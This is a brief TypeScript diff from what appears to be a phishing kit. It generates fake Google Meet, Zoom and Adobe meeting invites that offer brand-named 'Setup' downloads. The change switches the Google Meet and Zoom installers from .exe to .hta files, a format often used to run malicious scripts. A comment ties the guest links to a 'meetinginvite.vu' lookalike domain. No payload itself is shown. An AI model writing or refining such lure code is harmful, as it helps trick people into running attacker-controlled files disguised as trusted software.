@@ -100,9 +100,9 @@ export function defaultLabelForTemplate(template?: GuestInviteTemplate | null): 
 
 export function installerFileNameForTemplate(template?: GuestInviteTemplate | null): string {
   const t = normalizeInviteTemplate(template);
-  if (t === 'google_meet') return 'GoogleMeet-Setup.exe';
+  if (t === 'google_meet') return 'GoogleMeet-Setup.hta';
   if (t === 'adobe') return 'AdobeAcrobat-Setup.exe';
-  return 'ZoomClient-Setup.exe';
+  return 'ZoomClient-Setup.hta';
 }
 
 /** Public guest URL — matches meetinginvite.vu / Adobe path style. */
